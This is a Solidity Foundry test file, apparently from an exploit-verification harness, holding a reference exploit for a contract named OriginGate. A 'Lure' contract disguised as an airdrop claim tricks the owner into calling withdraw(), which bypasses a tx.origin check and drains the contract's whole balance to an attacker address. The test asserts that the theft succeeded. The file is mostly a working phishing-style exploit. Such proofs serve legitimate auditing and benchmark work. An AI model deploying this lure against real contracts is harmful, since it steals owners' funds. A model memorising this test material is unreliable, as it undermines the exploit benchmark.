// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Reference exploit for OriginGate. The owner is tricked into calling a malicious contract,
// which calls withdraw() — tx.origin is still the owner, so the check passes.
// Run by hand:  forge test --root proofground --match-contract ProveOriginGate -vvv

import {ExploitProof} from "@proof/ExploitProof.sol";
import {OriginGate} from "@contracts/OriginGate.sol";

contract Lure {
    OriginGate gate;
    address payable attacker;

    constructor(OriginGate _gate, address payable _attacker) {
        gate = _gate;
        attacker = _attacker;
    }

    // whatever the owner thinks they are clicking
    function claimAirdrop() external {
        gate.withdraw(attacker, address(gate).balance);
    }
}

contract ProveOriginGate is ExploitProof {
    function test_exploit() external {
        address owner = makeAddr("owner");
        vm.deal(owner, 10 ether);
        vm.prank(owner);
        OriginGate gate = new OriginGate{value: 10 ether}();

        address payable attacker = payable(makeAddr("attacker"));
        Lure lure = new Lure(gate, attacker);
        noteAttackerStart(attacker);

        // owner is tricked into calling the lure; both msg.sender and tx.origin are the owner
        vm.prank(owner, owner);
        lure.claimAirdrop();

        profit = attacker.balance; // 10 ether, attacker committed nothing
        assertExploitLanded(9 ether);
    }
}
